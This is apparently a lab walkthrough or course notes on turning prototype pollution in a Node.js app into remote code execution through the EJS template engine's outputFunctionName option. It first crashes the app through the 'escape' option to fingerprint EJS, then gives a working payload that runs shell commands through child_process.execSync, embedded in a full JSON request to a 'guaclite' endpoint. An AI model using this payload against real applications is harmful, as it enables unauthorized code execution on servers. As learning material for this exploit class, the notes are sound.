## Theory

We start by reviewing the EJS template.
The actual JavaScript code that runs EJS is 1120 lines.
For this reason, we'll start with EJS to familiarize ourselves with the process, and then move on to more complicated libraries like Handlebars and Pug.

One of the components that make EJS simpler than Pug and Handlebars is that EJS lets developers write pure JavaScript to generate templates.
Other templating engines, like Pug and Handlebars are essentially separate languages that must be parsed and compiled into JavaScript.

To discover how to exploit EJS using prototype pollution, we'll use the interactive Node CLI.
This will allow us to load the EJS module, run functions, and debug them directly without having to reload the web page.
This will obviously allow us to reload the CLI quicker when we break things with prototype pollution since we won't have to restart the web server.
When we get a working payload using the CLI, we'll use that information to exploit the web application.

We can start by reviewing the compile function of the EJS template:

![](../../03.%20Images/t10-ss40.png)

The **compile** function accepts two arguments:
1. a template string.
2. an options object.
After checking for deprecated options, a variable is created from the **Template** class and the **compile** function is executed within the **Template** object.

A quick review of the _render_ function reveals that it is a wrapper for the _compile_ function with a cache:

![](../../03.%20Images/t10-ss41.png)

We can try executing both the functions:

![](../../03.%20Images/t10-ss42.png)

Next, we provide the **compile** and **render** functions a template, some data, and options.
The response is a compiled JavaScript function. When run, the function outputs "Hello, World".

Reviewing the template class:

![](../../03.%20Images/t10-ss43.png)

We find that the _options_ object is parsed at the starting of the function.
However, many values are only set if the value exists. This is a perfect location to inject with a prototype pollution vulnerability.

The **escapeFunction** value is set to the **opts.escape** value.
If we remember the modifications to the **toString** function, when an application or library expects a function but instead receives a string, the application crashes.
We can try this out on the options function:

![](../../03.%20Images/t10-ss44.png)

Here, we create an escape function.
Our escape function accepts a parameter(_x_), logs a message, and returns the **x** parameter. When rendering a template with the **escape** function, the message is logged and the template is returned.

We define a new object `o` with an `escape` property that is set to a string value.
When we pass this object to `ejs.render()`, the `escape` property is not a function, and the `ejs.render()` function throws an error because it expects the `escape` property to be a function:

![](../../03.%20Images/t10-ss45.png)

However, this is great for us because we can determine if the target application is running EJS.
If a prototype pollution vulnerability sets **escape** to a string, and the application crashes, we know we are dealing with an application running EJS.

To see this in our application, we can edit our payload as follows:

![](../../03.%20Images/t10-ss46.png)

and with this, we get an error crashing the application:

![](../../03.%20Images/t10-ss47.png)

In blackbox scenarios, the **toString** function is a great method to discover if the application is vulnerable to prototype pollution.
However, this EJS proof of concept can be used to narrow down the templating engine that is being used in the application.
Next, let's attempt to obtain RCE using EJS.

## Code Execution

The most natural progression to achieve RCE would be to inject custom JavaScript into the template function during compilation.
When the template function executes, so would our injected code.
We'll again review the **compile** function in our IDE by opening node_modules/ejs/lib/ejs.js.
We will start reviewing from this last step to find if we can inject into the template near the end of the process.
This will lower the risk of the prototype pollution interfering with normal operation of the application and our payload has less chance of getting modified in the process.

Now, in the compile function:

![](../../03.%20Images/t10-ss48.png)

The code checks if the **outputFunctionName** variable within the **opts** object exists.
If the variable does exist, the variable is added to the content.

A quick search through the code finds that this variable is only set by a developer using the EJS library. The documentation states that:

```text
The outputFunctionName variable is set to a string (e.g., 'echo' or 'print') for a function to print output inside scriptlet tags.
```

The **outputFunctionName** is typically not set in templates.
Because of this, we can most likely use it to inject with prototype pollution.

The string we're injecting into is as follows:

```javascript
 'var ' + opts.outputFunctionName + ' = __append;'
```

For this to work, our payload will need to complete the variable declaration on the left side, add the code we want to run in the middle, and complete the variable declaration on the right side.
If our payload makes the function invalid, EJS will crash when the page is rendered.
The payload will be as follows:

```javascript
 var x = 1; WHATEVER_JSCODE_WE_WANT ; y = __append;'
```

In a console it will look something like this:

![](../../03.%20Images/t10-ss49.png)

Thus, our final payload will be as follows:

```javascript
"__proto__":
{
    "outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
}
```

Using it on the application, our request would be:

```JSON
{
    "connection":{
        "type":"rdp",
        "settings":{
            "hostname":"rdesktop",
            "username":"abc",
            "password":"abc",
            "port":"3389",
            "security":"any",
            "ignore-cert":"true",
            "client-name":"",
            "console":"false",
            "initial-program":"",
            "__proto__":
            {
                "outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
            }
        }
    }
}
```

Generating the token, and passing it in the guaclite endpoint:

We have achieved blind RCE.
